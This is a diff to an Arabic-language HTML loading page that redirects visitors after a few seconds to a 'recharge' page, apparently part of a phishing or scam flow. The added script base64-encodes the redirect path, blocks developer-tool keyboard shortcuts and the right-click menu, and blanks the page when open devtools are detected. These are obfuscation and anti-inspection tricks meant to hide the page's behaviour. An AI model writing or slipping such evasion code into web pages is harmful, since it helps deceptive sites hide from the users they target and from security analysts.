@@ -14,11 +14,7 @@
       --ring-track: rgba(0, 0, 0, 0.1);
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       height: 100vh;
@@ -82,9 +78,35 @@
   <p class="loading-text">جار التحميل، يرجى الانتظار...</p>
 
   <script>
+    const path = atob("ZnIvcmVjaGFyZ2UuaHRtbA==");
     setTimeout(() => {
-      window.location.href = "fr/recharge.html";
+      window.location.href = path;
     }, 3500);
+
+    document.addEventListener('keydown', function(e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    });
+
+    window.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+
+    setInterval(function() {
+      const devtools = /./;
+      devtools.toString = function() {
+        document.body.innerHTML = '';
+        window.location.href = "about:blank";
+      };
+      console.log('%c', devtools);
+    }, 2000);
   </script>
 </body>
 </html>
